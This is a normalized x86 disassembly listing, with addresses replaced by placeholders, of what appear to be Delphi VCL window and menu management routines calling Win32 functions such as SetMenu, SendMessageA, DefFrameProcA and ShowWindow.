mov eax [ ebp ]
call sub_457d44
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_457d30
mov [ esp ] eax
jmp r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
mov edx esi
call sub_413d6c
call sub_403104
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_457d30
cmp edi [ eax + 0x4 ]
jne r-xdata
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_457d30
mov [ esp ] eax
jmp r-xdata
mov edx esi
mov eax [ ebp ]
call sub_457d30
cmp edi [ eax + 0x4 ]
jne r-xdata
sub_4543d4
push ebx
mov ebx eax
mov eax ebx
call sub_4543cc
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x240 ]
call sub_423738
test eax eax
jne r-xdata
mov al 0x1
pop ebx
retn
sub_4543fc
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x22f ]
je r-xdata
pop esi
pop ebx
retn
cmp bl 0x1
jne r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
cmp [ esi + 0x230 ] 0x0
jne r-xdata
mov al [ esi + 0x22f ]
mov [ esi + 0x22f ] bl
cmp bl 0x2
je r-xdata
mov eax esi
call sub_43e080
mov dl 0x1
mov eax esi
call sub_454760
cmp [ esi + 0x1a5 ] 0x0
jne r-xdata
cmp al 0x2
jne r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov eax esi
call sub_4547dc
mov edx eax
mov eax esi
call sub_43a4ec
cmp bl 0x1
jne r-xdata
mov eax esi
call sub_43e21c
mov dl 0x1
mov eax esi
call sub_453780
sub_45447c
push ebx
push esi
push edi
push ebp
mov ebp eax
cmp [ ebp + 0x22f ] 0x2
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebp + 0x254 ] 0x0
je r-xdata
xor esi esi
mov eax [ ebp + 0x248 ]
test eax eax
je r-xdata
xor edi edi
mov eax [ ebp + 0x258 ]
test eax eax
je r-xdata
mov edx [ eax ]
call [ edx + 0x34 ]
mov esi eax
mov eax ebp
call sub_440b28
push eax
call GetMenu
cmp esi eax
setne bl
push edi
push esi
push 0x230
mov eax [ ebp + 0x254 ]
push eax
call SendMessageA
test bl bl
je r-xdata
call sub_44ab08
mov edi eax
mov eax ebp
call sub_440b28
push eax
call DrawMenuBar
sub_4544f8
push ebx
mov ebx edx
mov [ eax + 0x260 ] ebx
test ebx ebx
je r-xdata
pop ebx
retn
mov edx eax
mov eax ebx
call sub_419924
xor edx edx
mov eax ebx
call sub_44c4a0
sub_45451c
push ebx
mov ebx eax
cmp edx [ ebx + 0x258 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x258 ] edx
test edx edx
je r-xdata
mov eax ebx
call sub_45447c
mov eax edx
mov edx ebx
call sub_419924
sub_454544
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45470a
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
mov eax [ ebx + 0x248 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
call sub_457d74
dec eax
test eax eax
jl r-xdata
test [ ebx + 0x1c ] 0x8
jne r-xdata
xor edx edx
call sub_44e054
inc eax
mov [ ebp - 0x4 ] eax
xor edi edi
xor esi esi
test esi esi
je r-xdata
inc edi
dec [ ebp - 0x4 ]
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_457d60
cmp ebx eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
mov eax esi
call sub_419924
mov [ ebx + 0x248 ] esi
test esi esi
je r-xdata
test [ esi + 0x1c ] 0x8
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_457d60
cmp esi [ eax + 0x248 ]
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_4059b8
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b55c
call sub_403890
mov eax ebx
call sub_440e2c
test al al
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ ebx + 0x22e ] 0x0
je r-xdata
push 0x0
mov eax ebx
call sub_440b28
push eax
call SetMenu
mov eax [ ebx + 0x248 ]
cmp [ eax + 0x5c ] 0x0
jne r-xdata
cmp [ ebx + 0x229 ] 0x3
je r-xdata
mov eax ebx
call sub_45447c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_454711
lea eax [ ebp - 0x10 ]
call sub_403e54
retn
mov dl 0x1
mov eax ebx
call sub_455608
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
cmp [ ebx + 0x22f ] 0x1
je r-xdata
mov eax ebx
call sub_440e2c
test al al
je r-xdata
mov eax ebx
call sub_440e2c
test al al
je r-xdata
mov eax [ ebx + 0x248 ]
mov edx [ eax ]
call [ edx + 0x34 ]
mov edi eax
mov eax ebx
call sub_440b28
push eax
call GetMenu
cmp edi eax
je r-xdata
push 0x0
mov eax ebx
call sub_440b28
push eax
call SetMenu
jmp r-xdata
mov eax ebx
call sub_440b28
mov edx eax
mov eax esi
call sub_44e054
jmp r-xdata
mov eax [ ebx + 0x248 ]
mov edx [ eax ]
call [ edx + 0x34 ]
push eax
mov eax ebx
call sub_440b28
push eax
call SetMenu
sub_45472c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_454718
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test esi esi
je r-xdata
test [ ebx + 0x1c ] 0x1
je r-xdata
cmp esi 0x24
jl r-xdata
mov [ ebx + 0x25c ] esi
cmp [ ebx + 0x25c ] 0x0
je r-xdata
sub_454788
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_45477c
cmp bl al
je r-xdata
pop esi
pop ebx
retn
xor eax eax
mov [ esi + 0x25c ] eax
test bl bl
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov [ esi + 0x25c ] eax
sub_4547f4
push ebx
mov ebx eax
mov eax ebx
call sub_440140
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x70 ] 0xff00000f
jne r-xdata
mov eax ebx
call sub_4547dc
cmp eax [ ebx + 0x70 ]
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_4547dc
mov edx eax
mov eax ebx
call sub_43a4ec
mov edx 0xff00000f
mov eax ebx
call sub_43a4ec
pop ebx
retn
sub_454878
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x22b ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x22b ] bl
test [ esi + 0x1c ] 0x10
jne r-xdata
cmp [ esi + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
push eax
mov eax esi
call sub_440b28
push eax
call ShowWindow
sub_4548b8
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov ebx eax
mov al [ ebx + 0x231 ]
test al al
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
cmp [ edx + 0x44 ] 0x0
je r-xdata
xor edx edx
mov [ esp ] edx
cmp al 0x2
jne r-xdata
mov al [ ebx + 0x231 ]
cmp al 0x3
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_4542d0
mov eax [ eax + 0x4 ]
mov [ esp ] eax
jmp r-xdata
cmp al 0x1
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x68 ] 0x0
je r-xdata
mov eax ebx
call sub_4542d0
mov eax [ eax + 0x4 ]
mov [ esp + 0x4 ] eax
mov eax [ rw-data ]
call sub_457d44
dec eax
test eax eax
jl r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_457d30
mov eax [ eax + 0x4 ]
mov [ esp ] eax
mov eax [ rw-data ]
mov eax [ eax + 0x68 ]
call sub_4542d0
mov eax [ eax + 0x4 ]
mov [ esp ] eax
jmp r-xdata
inc eax
mov [ esp + 0x10 ] eax
xor esi esi
inc esi
dec [ esp + 0x10 ]
jne r-xdata
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
je r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_457d30
mov eax [ eax + 0x4 ]
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_457d44
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
mov [ esp + 0x8 ] 0x0
inc [ esp + 0x8 ]
dec edi
jne r-xdata
mov al [ ebx + 0x230 ]
cmp al 0x4
jne r-xdata
mov edx [ esp + 0x8 ]
mov eax [ rw-data ]
call sub_457d30
mov eax [ eax + 0x4 ]
cmp eax [ esp + 0x4 ]
jne r-xdata
cmp al 0x6
jne r-xdata
mov eax [ ebx + 0x48 ]
push eax
mov ebp [ ebx + 0x4c ]
push ebp
mov edx esi
mov eax [ rw-data ]
call sub_457d30
call sub_457a34
push eax
mov edx esi
mov eax [ rw-data ]
call sub_457d30
call sub_457a18
sub eax ebp
sar eax 0x1
jns r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_457d30
call sub_457a00
mov ebp eax
add ebp [ ebx + 0x40 ]
mov edx [ esp + 0x8 ]
mov eax [ rw-data ]
call sub_457d30
call sub_457a00
sub ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_457d30
call sub_457a00
push eax
mov edx esi
mov eax [ rw-data ]
call sub_457d30
call sub_457a4c
pop edx
add edx eax
mov eax [ ebx + 0x48 ]
add eax ebp
cmp edx eax
jge r-xdata
mov eax [ ebx + 0x48 ]
push eax
mov ebp [ ebx + 0x4c ]
push ebp
mov edx esi
mov eax [ rw-data ]
call sub_457d30
call sub_457a34
push eax
mov edx esi
mov eax [ rw-data ]
call sub_457d30
call sub_457a18
sub eax ebp
sar eax 0x1
jns r-xdata
pop edx
add edx eax
push edx
mov edx esi
mov eax [ rw-data ]
call sub_457d30
call sub_457a00
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_457d30
call sub_457a4c
sub eax [ ebx + 0x48 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
mov edx esi
mov eax [ rw-data ]
call sub_457d30
call sub_457a34
add eax [ ebx + 0x44 ]
push eax
mov edx [ esp + 0xc ]
mov eax [ rw-data ]
call sub_457d30
call sub_457a34
pop edx
sub edx eax
mov [ esp + 0xc ] edx
mov edx esi
mov eax [ rw-data ]
call sub_457d30
call sub_457a34
push eax
mov edx esi
mov eax [ rw-data ]
call sub_457d30
call sub_457a18
pop edx
add edx eax
mov eax [ esp + 0xc ]
add eax [ ebx + 0x4c ]
cmp edx eax
jge r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_457d30
call sub_457a00
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_457d30
call sub_457a4c
add ebp eax
sub ebp [ ebx + 0x48 ]
pop edx
add edx eax
push edx
mov edx esi
mov eax [ rw-data ]
call sub_457d30
call sub_457a00
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_457d30
call sub_457a4c
sub eax [ ebx + 0x48 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
add ebp eax
mov edx ebp
mov eax ebx
pop ecx
mov ebp [ eax ]
call [ ebp + 0x84 ]
jmp r-xdata
adc eax 0x0
mov eax [ ebx + 0x48 ]
push eax
mov eax [ ebx + 0x4c ]
push eax
mov ecx [ esp + 0x14 ]
mov edx ebp
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0x84 ]
mov edx esi
mov eax [ rw-data ]
call sub_457d30
call sub_457a34
push eax
mov edx esi
mov eax [ rw-data ]
call sub_457d30
call sub_457a18
pop edx
add edx eax
sub edx [ ebx + 0x4c ]
mov [ esp + 0xc ] edx
add ebp eax
mov edx ebp
mov eax ebx
pop ecx
mov ebp [ eax ]
call [ ebp + 0x84 ]
jmp r-xdata
adc eax 0x0
sub_454c0c
push ebx
push esi
push edi
push ecx
mov esi edx
mov edi eax
mov edx esi
mov eax edi
call sub_4521c0
mov edx esi
mov eax edi
call sub_4575b0
cmp [ edi + 0x30 ] 0x0
jne r-xdata
mov [ esi + 0x24 ] 0x8
test [ edi + 0x1c ] 0x10
je r-xdata
cmp [ edi + 0x190 ] 0x0
jne r-xdata
mov al [ edi + 0x230 ]
dec eax
sub al 0x2
jae r-xdata
cmp [ edi + 0x30 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x30 ]
mov [ esi + 0x1c ] eax
and [ esi + 0x4 ] 0xbffcffff
mov bl [ edi + 0x228 ]
mov al [ edi + 0x229 ]
mov [ esp ] al
cmp [ edi + 0x22f ] 0x1
jne r-xdata
mov [ esi + 0xc ] 0x80000000
mov [ esi + 0x10 ] 0x80000000
or [ esi + 0x4 ] 0xcf0000
jmp r-xdata
xor eax eax
mov al [ esp ]
cmp eax 0x5
ja r-xdata
mov al [ esp ]
test al al
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov al [ esp ]
add al 0xfc
sub al 0x2
jae r-xdata
jmp [ eax * 4 + jump_table_454cbb ]
mov [ esp ] 0x2
sub al 0x3
jne r-xdata
mov al [ esp ]
sub al 0x3
jae r-xdata
mov [ esi + 0x8 ] 0x80
lea edx [ esi + 0x8 ]
mov eax edi
call sub_43d94c
mov al [ r-xdata ]
and al bl
mov ebx eax
cmp [ edi + 0x30 ] 0x0
jne r-xdata
or [ esi + 0x4 ] 0xc00000
jmp r-xdata
or [ esi + 0x4 ] 0xc40000
mov al [ edi + 0x230 ]
sub al 0x1
je r-xdata
mov eax [ esi + 0x4 ]
or eax 0x80000000
or eax 0xc00000
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] 0x101
lea edx [ esi + 0x8 ]
mov eax edi
call sub_43d94c
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov [ edi + 0x22b ] 0x0
cmp [ edi + 0x22f ] 0x1
jne r-xdata
mov bl [ r-xdata ]
jmp r-xdata
cmp [ edi + 0x190 ] 0x0
jne r-xdata
mov [ esi + 0x14 ] 0x80000000
mov [ esi + 0x18 ] 0x80000000
jmp r-xdata
sub al 0x2
jne r-xdata
mov al [ r-xdata ]
and al bl
mov ebx eax
mov [ esi + 0x24 ] 0x2808
mov eax [ esi + 0x4 ]
or eax __dos_header
or eax 0x80
mov [ esi + 0x4 ] eax
test bl 0x8
je r-xdata
or [ esi + 0x4 ] 0x80000
test bl 0x2
je r-xdata
test bl 0x1
je r-xdata
or [ esi + 0x4 ] 0x80000000
test [ edi + 0x1d ] 0x2
je r-xdata
or [ esi + 0x8 ] 0x400
test bl 0x4
je r-xdata
or [ esi + 0x4 ] 0x20000
mov al [ edi + 0x22b ]
cmp al 0x1
jne r-xdata
cmp [ edi + 0x22f ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff3fffff
or [ esi + 0x4 ] 0x10000
cmp al 0x2
jne r-xdata
or [ esi + 0x4 ] 0x20000000
jmp r-xdata
mov eax r-xdata
mov [ esi + 0x28 ] eax
test bl 0x1
je r-xdata
or [ esi + 0x4 ] 0x1000000
jmp r-xdata
sub_454e1d
add [ eax ] al
add [ ecx ] cl
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ebx + 0x56 ] dl
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_4521d0
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ ebx + 0x229 ] 0x3
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov al [ ebx + 0x22f ]
sub al 0x2
je r-xdata
push 0x0
push 0x1
push 0x80
mov eax ebx
call sub_440b28
push eax
call SendMessageA
mov eax ebx
call sub_45577c
push eax
push 0x1
push 0x80
mov eax ebx
call sub_440b28
push eax
call SendMessageA
jmp r-xdata
mov [ esp + 0x4 ] 0xff00
xor eax eax
mov [ esp ] eax
mov esi [ ebx + 0x258 ]
test esi esi
je r-xdata
dec al
je r-xdata
push 0x56330001
push 0x0
push 0x0
mov eax ebx
call sub_439d50
push eax
mov eax ebx
call sub_439d94
push eax
mov eax ebx
call sub_440b28
push eax
push 0x0
mov eax [ rw-data ]
push eax
lea eax [ esp + 0x20 ]
push eax
mov edx r-xdata
xor ecx ecx
mov eax 0x200
call sub_406868
mov [ ebx + 0x254 ] eax
push ebx
push sub_453d68
call sub_41a8e4
mov [ ebx + 0x278 ] eax
push 0xfffffffc
mov eax [ ebx + 0x254 ]
push eax
call GetWindowLongA
mov [ ebx + 0x274 ] eax
mov eax [ ebx + 0x278 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x254 ]
push eax
call SetWindowLongA
jmp r-xdata
mov eax esi
call sub_44ab08
mov [ esp ] eax
push 0x13
push 0x0
push 0x0
push 0x0
push 0x0
push 0xffffffff
mov eax ebx
call sub_440b28
push eax
call SetWindowPos
jmp r-xdata
sub_454f6a
add [ eax ] al
push ebp
mov ebp esp
add esp 0xffffff4c
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xb4 ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_455095
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov esi edx
lea edi [ ebp - 0xb0 ]
mov ecx 0x23
[ edi ] [ esi ]
and [ ebp - 0xa8 ] 0xfff7ffff
lea edx [ ebp - 0xb0 ]
mov eax ebx
call sub_43dcb0
and [ ebx + 0x2f4 ] 0xef
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
lea edx [ ebp - 0xb4 ]
mov eax [ rw-data ]
call sub_4059b8
mov ecx [ ebp - 0xb4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b520
call sub_403890
cmp [ eax + 0x254 ] 0x0
jne r-xdata
mov eax ebx
call sub_457488
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45509c
lea eax [ edx + 0x4c ]
mov [ ebp - 0x24 ] eax
mov eax [ edx ]
mov [ ebp - 0x20 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x1c ] eax
mov eax [ edx + 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ edx + 0x10 ]
mov [ ebp - 0x14 ] eax
mov eax [ edx + 0x14 ]
mov [ ebp - 0x10 ] eax
mov eax [ edx + 0x18 ]
mov [ ebp - 0xc ] eax
mov eax [ edx + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ edx + 0x20 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x24 ]
push eax
push 0x0
push 0x220
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
mov [ ebx + 0x180 ] eax
or [ ebx + 0x2f4 ] 0x10
jmp r-xdata
sub_4550a4
push ebx
mov ebx eax
test [ ebx + 0x2f4 ] 0x10
je r-xdata
mov eax ebx
call sub_43df1c
push 0x0
mov eax ebx
call sub_440b28
push eax
push 0x221
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
xor eax eax
mov [ ebx + 0x254 ] eax
pop ebx
retn
sub_4550e8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x254 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_43e6a0
cmp [ esi ] 0x5
jne r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax [ ebx + 0x254 ]
push eax
mov eax ebx
call sub_440b28
push eax
call DefFrameProcA
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax ebx
call sub_440b28
push eax
call DefWindowProcA
mov [ esi + 0xc ] eax
jmp r-xdata
pop esi
pop ebx
retn
sub_45514c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_4551f4
push [ fs : eax ]
mov [ fs : eax ] esp
cmp edi [ ebx + 0x220 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4551fb
lea eax [ ebp - 0x4 ]
call sub_403e54
retn
test edi edi
je r-xdata
mov [ ebx + 0x220 ] edi
test [ ebx + 0x1c ] 0x1
jne r-xdata
cmp ebx edi
je r-xdata
cmp [ ebx + 0x22e ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4059b8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b520
call sub_403890
mov eax edi
call sub_4514e0
cmp ebx eax
jne r-xdata
mov eax ebx
mov si 0xffb2
call sub_403300
mov eax ebx
call sub_455504
test [ ebx + 0x1c ] 0x1
jne r-xdata
mov eax edi
mov si 0xffb8
call sub_403300
test al al
jne r-xdata
sub_455204
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test bl bl
je r-xdata
mov edx [ edi + 0x220 ]
mov eax esi
call sub_43d604
test al al
je r-xdata
mov edx [ edi + 0x224 ]
mov eax esi
call sub_43d604
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
xor edx edx
mov eax edi
call sub_45514c
mov eax [ esi + 0x30 ]
mov [ edi + 0x224 ] eax
sub_45524c
push ebx
push esi
mov esi eax
mov bl [ esi + 0x22e ]
mov eax esi
call sub_45514c
test bl bl
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0xc4 ]
sub_455270
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
xor ebx ebx
inc [ rw-data ]
cmp [ edi + 0x250 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x64 ] edx
mov eax [ rw-data ]
mov [ eax + 0x68 ] edi
mov eax [ rw-data ]
mov eax [ eax + 0x50 ]
mov edx edi
call sub_413eb0
mov eax [ rw-data ]
mov eax [ eax + 0x50 ]
mov ecx edi
xor edx edx
call sub_413de8
mov eax edi
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
cmp edi [ ebp - 0x4 ]
je r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x6c ] edx
mov eax [ rw-data ]
mov [ eax + 0x6c ] edi
mov eax [ rw-data ]
mov eax [ eax + 0x4c ]
mov edx edi
call sub_413eb0
mov eax [ rw-data ]
mov eax [ eax + 0x4c ]
mov ecx edi
xor edx edx
call sub_413de8
jmp r-xdata
xor eax eax
mov [ edi + 0x220 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0x220 ] eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x54 ]
or ax [ r-xdata ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x54 ] ax
xor edx edx
push ebp
push sub_4554e0
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov eax [ eax + 0x78 ]
cmp edi eax
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x20
jne r-xdata
cmp [ edi + 0x224 ] 0x0
jne r-xdata
test eax eax
je r-xdata
mov eax [ edi + 0x224 ]
cmp eax [ ebp - 0x4 ]
je r-xdata
mov [ edi + 0x224 ] edi
mov eax [ rw-data ]
mov [ eax + 0x78 ] edi
mov eax edi
call sub_440b28
mov dx 0xb000
call sub_4512a8
test al al
jne r-xdata
call sub_440b28
mov esi eax
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x78 ] edx
mov dx 0xb001
mov eax esi
call sub_4512a8
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4554e7
mov eax [ ebp - 0x4 ]
mov dx [ r-xdata ]
not edx
and dx [ eax + 0x54 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x54 ] dx
retn
jmp r-xdata
call sub_40393c
jmp r-xdata
call sub_40393c
jmp r-xdata
mov esi [ edi + 0x224 ]
test esi esi
je r-xdata
mov eax [ edi + 0x224 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_43d604
test al al
je r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
mov eax [ edi + 0x224 ]
call sub_440b28
mov esi eax
mov eax [ edi + 0x224 ]
mov eax [ eax + 0x30 ]
mov [ edi + 0x224 ] eax
mov dx 0xb01b
mov eax esi
call sub_4512a8
test al al
jne r-xdata
jmp r-xdata
mov eax [ esi + 0x30 ]
cmp eax [ edi + 0x224 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
xor ecx ecx
mov edx 0xb007
mov eax edi
call sub_43b4f4
mov eax [ edi + 0x27c ]
test eax eax
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
call sub_40393c
jmp r-xdata
mov esi eax
mov [ edi + 0x224 ] esi
mov eax esi
call sub_440b28
mov dx 0xb01a
call sub_4512a8
test al al
jne r-xdata
cmp eax [ ebp - 0x4 ]
je r-xdata
mov esi [ esi + 0x30 ]
test esi esi
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xcc ]
call sub_40393c
jmp r-xdata
push 0x0
xor ecx ecx
mov edx 0xb02a
call sub_43b4f4
sub_455504
push ebx
push esi
mov edx [ eax + 0x220 ]
test edx edx
je r-xdata
mov ebx eax
cmp [ eax + 0x250 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb029
mov eax ebx
call sub_43b4f4
mov ebx edx
jmp r-xdata
mov eax ebx
call sub_440b28
push eax
call SetFocus
mov eax ebx
call sub_440b28
mov esi eax
call GetFocus
cmp esi eax
jne r-xdata
sub_455554
push ebx
push esi
mov ebx edx
mov esi eax
mov [ esi + 0x22e ] bl
mov eax [ esi + 0x27c ]
test eax eax
je r-xdata
test bl bl
je r-xdata
push 0x0
xor ecx ecx
mov cl bl
mov edx 0xb02b
call sub_43b4f4
pop esi
pop ebx
retn
cmp [ esi + 0x220 ] 0x0
jne r-xdata
mov dl 0x1
mov eax esi
call sub_455608
mov eax esi
call sub_455504
test [ esi + 0x1c ] 0x10
jne r-xdata
push 0x1
push 0x0
mov cl 0x1
xor edx edx
mov eax esi
call sub_440f50
mov edx eax
mov eax esi
call sub_45514c
sub_4555b8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x22e ] 0x0
je r-xdata
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
cmp [ ebx + 0x220 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_4541d0
test eax eax
je r-xdata
push esi
xor ecx ecx
mov edx 0xb004
mov eax [ ebx + 0x220 ]
call sub_43b4f4
mov eax ebx
call sub_4541d0
mov edx esi
call sub_4555b8
sub_455608
push esi
test [ eax + 0x2f4 ] 0x8
jne r-xdata
pop esi
retn
mov ecx [ rw-data ]
cmp [ ecx + 0x44 ] 0x0
je r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x44 ]
cmp [ ecx + 0x248 ] 0x0
je r-xdata
mov ecx [ rw-data ]
cmp eax [ ecx + 0x44 ]
je r-xdata
cmp [ eax + 0x22f ] 0x1
je r-xdata
xor esi esi
test [ eax + 0x1c ] 0x10
jne r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x44 ]
cmp [ ecx + 0x22f ] 0x2
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x248 ]
test dl dl
je r-xdata
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov edx esi
call sub_44e634
mov edx esi
call sub_44e618
jmp r-xdata
mov ecx [ eax + 0x248 ]
cmp [ ecx + 0x5c ] 0x0
jne r-xdata
mov esi [ eax + 0x248 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
sub_4556b0
push ebx
push esi
push edi
push ebp
mov edi ecx
mov ebx edx
mov ebp eax
test ebx ebx
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
jmp r-xdata
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
cmp edi ebx
je r-xdata
mov ebx esi
push 0x0
push 0x0
push ebp
mov eax ebx
call sub_440b28
push eax
call SendMessageA
sub_4556fc
push ebx
mov ebx eax
mov ecx ebx
mov edx [ ebx + 0x220 ]
mov eax 0xb000
call sub_4556b0
cmp [ ebx + 0x28a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x28c ]
call [ ebx + 0x288 ]
sub_45572c
push ebx
mov ebx eax
mov ecx ebx
